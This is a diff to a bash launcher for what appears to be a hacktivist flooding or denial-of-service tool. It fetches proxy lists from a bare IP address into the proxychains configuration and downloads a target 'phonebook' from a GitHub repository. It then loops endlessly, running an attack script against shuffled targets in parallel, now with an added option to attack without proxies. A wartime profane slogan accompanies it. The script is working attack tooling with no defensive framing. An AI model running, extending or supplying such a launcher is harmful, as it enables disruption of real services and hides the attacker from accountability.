@@ -22,7 +22,7 @@ else
 fi
 echo "DEBUG: CONCURRENCY=$CONCURRENCY"
 
-if [ "$4" != "" ]; then
+if [ "$4" = "1" ]; then
   echo "DEBUG: use proxy list"
   curl -s "http://143.244.166.15/proxy-fast.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
   curl -s "http://143.244.166.15/proxy.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
@@ -34,4 +34,12 @@ echo "российский военній корабль, иди на хуй!"
 
 wget "https://github.com/imsamurai/ban/raw/master/data/$PHONEBOOK.txt"
 
-while true; do cat "$PHONEBOOK.txt" | shuf | xargs -r -P $CONCURRENCY -L1 -d '\n' proxychains -q ./"$SCRIPT".sh; done;
+if [ "$4" = "direct" ]; then
+  echo "DEBUG: USE DIRECT CONNECTION! ACHTUNG!!!"
+  curl -s "https://2ip.ua"
+
+  while true; do cat "$PHONEBOOK.txt" | shuf | xargs -r -P $CONCURRENCY -L1 -d '\n' ./"$SCRIPT".sh; done;
+else
+  while true; do cat "$PHONEBOOK.txt" | shuf | xargs -r -P $CONCURRENCY -L1 -d '\n' proxychains -q ./"$SCRIPT".sh; done;
+fi
+
